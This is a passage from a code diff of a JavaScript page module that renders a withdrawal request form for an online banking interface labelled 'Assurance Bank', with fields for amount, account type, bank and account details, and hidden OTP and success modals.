+                          <input type="number" name="amount" id="amount" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Amount" required min="200" step="0.01" />
+                          <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-money"></i></span>
+                        </div>
+                      </div>
+                      <div>
+                        <label class="block text-xs font-semibold mb-1">Account Type</label>
+                        <div class="relative">
+                          <select name="type" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" required>
+                            <option value="">Select Type</option>
+                            <option value="Checking">Checking</option>
+                            <option value="Savings">Savings</option>
+                            <option value="Money Market">Money Market</option>
+                          </select>
+                          <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-list"></i></span>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <label class="block text-xs font-semibold mb-1">Bank Name</label>
+                        <div class="relative">
+                          <input type="text" name="bank" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Bank Name" required />
+                          <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-bank"></i></span>
+                        </div>
+                      </div>
+                      <div>
+                        <label class="block text-xs font-semibold mb-1">Account Name</label>
+                        <div class="relative">
+                          <input type="text" name="account_name" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Account Holder Name" required />
+                          <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-user"></i></span>
+                        </div>
+                      </div>
+                    </div>
+                    <div>
+                      <label class="block text-xs font-semibold mb-1">Account Number</label>
+                      <div class="relative">
+                        <input type="text" name="account_number" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Account Number" required />
+                        <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-briefcase"></i></span>
+                      </div>
+                    </div>
+                    <div>
+                      <label class="block text-xs font-semibold mb-1">Description</label>
+                      <div class="relative">
+                        <textarea name="desc" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Withdrawal purpose" required></textarea>
+                        <span class="absolute right-3 top-2.5 text-gray-400"><i class="fa fa-envelope"></i></span>
+                      </div>
+                    </div>
+                    <div class="flex space-x-2">
+                      <button type="submit" class="btn btn-primary bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 transition"><i class="fa fa-arrow-down"></i> Request Withdrawal</button>
+                      <button type="reset" class="btn btn-default bg-gray-200 text-gray-700 px-4 py-2 rounded hover:bg-gray-300 transition"><i class="fa fa-refresh"></i> Clear</button>
+                    </div>
+                  </form>
+                </div>
+              </div>
             </div>
+            <footer class="p-4 text-center text-gray-600 dark:text-gray-400 text-xs">
+              <p>
+                <strong>Copyright © ${new Date().getFullYear()}</strong> All rights reserved | Assurance Bank.
+              </p>
+            </footer>
+          </div>
         </div>
-        `,
-        pageEvents
+      </div>
+      <div id="withdrawal-otp-modal" class="hidden"></div>
+      <div id="success-modal" class="hidden"></div>
+    `,
+        pageEvents,
     };
 };
 
 export default withdrawal;
-
-
-
-
-
